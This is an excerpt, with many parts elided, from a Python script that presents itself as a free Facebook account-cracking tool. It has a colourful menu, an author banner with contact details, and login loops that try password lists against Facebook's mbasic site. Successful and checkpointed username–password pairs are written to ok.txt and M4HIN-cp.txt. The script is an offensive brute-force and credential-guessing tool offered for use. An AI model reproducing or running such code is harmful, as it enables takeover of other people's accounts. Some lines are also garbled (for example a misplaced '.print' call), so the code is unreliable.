...
def main():
    ...
    print('\033[1;92m│\033[1;37m[04] \033[1;96mCONTACT WITH OWNER \033[1;32m                    │')
    print('\033[1;92m│\033[1;37m[05] \033[1;96mREMOVE TOKEN\033[1;32m                           │')
    ...
    if psy in ('3', '03'):
        publiccrack()
    if psy in ('4', '04'):
    	os.system("xdg-open https://www.facebook.com/Ev4n69")
    if psy in ('5', '05'):
        time.sleep(2)
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING M4HIN VAU TOOL')  
    else:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mM4HIN-ok\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mM4HIN-cp\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[M4HIN-cp] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('M4HIN-cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[M4HIN-cp] %s | %s%s      ' % (user,pw,tahun(user)))
...
banner = """
  ...
  \033[0;91m       ░         ░  ░ ░  ░  ░ ░           ░    
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m MAHIN KHAN│\033[1;37m• \033[1;36mTHIS TOOL IS FREE \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m facebook.com/Ev4n69│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01403360872  │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m XDMAHIN-KHAN│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
